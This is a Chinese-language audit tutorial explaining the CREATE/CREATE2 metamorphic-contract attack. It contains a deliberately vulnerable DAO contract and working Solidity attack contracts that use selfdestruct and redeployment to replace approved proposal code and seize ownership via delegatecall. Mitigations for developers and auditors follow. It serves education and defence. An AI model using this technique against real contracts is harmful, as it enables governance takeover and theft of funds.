牛逼。

---

# **背景概述**



在以太坊生态中，合约地址的确定性生成机制为开发者提供了便利，但同时也引入了新的攻击面。本期我们将分析通过使用 CREATE 与 CREATE2 操作码在不同时间部署不同合约到同一地址的攻击手法及防御策略。往期智能合约安全审计入门文章见[合集](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU4ODQ3NTM2OA==&action=getalbum&album_id=3908229294878851080#wechat_redirect)。

# **前置知识**



我们先来了解以太坊地址生成的两种规则：



**1. CREATE**



CREATE 是以太坊虚拟机(EVM) 中用于动态部署智能合约的原生操作码。自以太坊创世区块起，所有合约部署均依赖此机制。其核心特点是地址生成依赖于部署者账户的 nonce，因此地址是非确定性的（无法在部署前精确预知）。



CREATE 生成的合约地址由部署者的地址和地址的 nonce 决定：



- 

```
contract address = last 20 bytes of keccak256(RLP(sender,nonce))
```



**2. CREATE2**



CREATE2 是以太坊在君士坦丁堡硬分叉（2019 年 2 月）中引入的新合约创建操作码(EIP-1014)。与传统的 CREATE 不同，在合约部署前，链下参与者就可预先计算出合约地址，这使得链下交互（如状态通道）和复杂合约架构成为可能。



CREATE2 生成的合约地址由以下四个参数决定：



- 

```
contract address = last 20 bytes of keccak256(0xff∣∣sender∣∣salt∣∣keccak256(init_code))
```



到这里，相信大家已经了解了以太坊生成合约地址的两种方式，心细的读者可能会想，如果计算出的合约地址已经存在了怎么办？这一点不必担心，在以太坊中，无论通过 CREATE 还是 CREATE2 生成的地址，只要已经在链上存在（无论是外部账户 EOA 还是合约账户），EVM 都会拒绝创建合约的请求。以下是地址冲突的两种场景：



**1. 目标地址是外部账户(EOA)**



- 规则：如果目标地址是一个已存在的 EOA（例如，用户钱包地址），EVM 会拒绝合约部署请求。
- 结果：交易失败，Gas 被消耗，合约不会被创建，且不会覆盖该地址的任何数据。



**2. 目标地址是合约账户**



- 规则：如果目标地址是一个已部署的合约账户，EVM 同样会拒绝部署请求。
- 结果：交易失败，Gas 被消耗，原有合约的代码和存储数据保持不变。



当然，凡事都有例外，如果目标地址为合约并且已通过 selfdestruct 自毁，此时就可以重新在该地址部署新合约。



至此，CREATE 与 CREATE2 这两种操作码的各种特性就介绍完了，下面我们看看如何利用这两个操作码的特性打出一套组合拳，完成一次合约攻击。



# **漏洞示例**

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(
            Proposal({target: target, approved: true, executed: false})
        );
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok,) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}
```



**漏洞分析**



这个 DAO 合约实现了一个基本的治理机制：Owner 通过 approve 函数审核并记录提案合约地址到 Proposals 数组中，任何用户随后可通过 execute 函数执行已审核的提案。看似严密的权限控制（仅 Owner 可审核提案）结合执行检查（提案需审核且未执行），实则存在一个隐蔽的逻辑漏洞：已审核的提案地址可能在执行时指向完全不同的合约代码。攻击者可分如下三步实施攻击：



**1. 部署正常合约，获取授权**



攻击者首先部署一个包含无害 executeProposal() 函数的合约 A，通过 Owner 审核将地址加入提案列表。



**2. 自毁原合约，抢占地址**



合约 A 执行自毁操作(selfdestruct) 清空代码，随后攻击者使用 CREATE2 操作码在同一地址部署恶意合约 B（包含危险逻辑的 executeProposal()）。



**3. 触发执行，劫持控制权**



当用户调用 execute 时，合约会通过 delegatecall 执行新部署的恶意合约 B 代码。由于 delegatecall 会保留当前合约的上下文，攻击者可通过此操作篡改 DAO 合约状态（如修改 Owner）或转移资产。



下面我们结合攻击合约来看看具体的攻击流程。

#  

# **攻击合约**

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Executed code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Executed code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint256(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
```



攻击流程如下：



\1. Alice 部署了 DAO 合约。

\2. Evil 部署 DeployerDeployer 合约，地址为 DD。

\3. Evil 调用 DD.deploy()，使用 CREATE2 部署 Deployer 到地址 D（固定 salt）。

\4. 调用 D.deployProposal()，创建 Proposal 合约地址 P，此时 D 的 nonce 是 0。

\5. Alice 批准地址 P。

\6. 攻击者调用 D.kill()，销毁 D，此时地址 D 的账户被清除，包括 nonce 也被重置为 0。

\7. 攻击者再次调用 DD.deploy()，重新部署 Deployer 到地址 D（同样的 CREATE2 参数）。

\8. 调用 D.deployAttack()，因为此时 D 的 nonce 被重置为 0 且 D 的地址没变，所以创建的 Attack 合约地址与之前的 Proposal 合约地址 P 是相同的。

\9. 此时，DAO 的 proposals 数组中有一个提案指向地址 P，但现在地址 P 已经被重新部署为 Attack 合约。因此，当调用 execute() 时，会执行 Attack 的 executeProposal()，最终通过 delegatecall 修改 DAO 的 Owner 为 msg.sender，也就是 Attack 合约。



攻击原理可以总结为攻击者利用 CREATE2 可以重新部署合约到同一地址的特性，先部署一个合法的 Proposal 合约，让 DAO 批准。然后销毁 Deployer 合约，重新部署同一地址的 Deployer，重置该地址的 nonce ，最终成功部署恶意合约到与之前 Proposal 相同的地址。由于 DAO 存储的提案地址现在指向恶意合约，当执行提案时，恶意代码在 DAO 的上下文中执行，成功将 Owner 修改为攻击者。



# **修复建议**



**作为开发者**：



- 在批准提案时，不仅要记录地址，还要记录该地址的代码哈希，并在执行时验证代码哈希是否一致。
- 避免使用 delegatecall 调用外部合约，除非有充分的安全措施。
- 考虑合约自毁后重新部署到同一地址的可能，进行外部调用时，需要检查外部合约是否可信，如果需要调用陌生的外部合约，建议检查合约中是否存在防自毁机制。



**作为审计者**：



- 识别外部调用的合约中是否存在 selfdestruct 自毁功能，如果存在，则需要警惕外部合约自毁后部署恶意代码到同一地址的攻击风险。
- 检查合约部署方式是否使用了 CREATE2，确保生成合约地址用到的 salt 值足够随机，防止因为合约地址被提前预测导致合约地址被攻击者抢先部署占用。
- 检查 DAO 执行提案时是否验证目标地址的代码一致性，比如比较当前代码哈希与批准时的哈希。
- 谨慎分析 delegatecall 的使用场景，确认目标地址是否可信，是否存在任意地址调用的风险。
- 审查提案的生命周期管理，比如是否有机制防止提案被修改或替换，例如在批准后锁定目标地址的状态。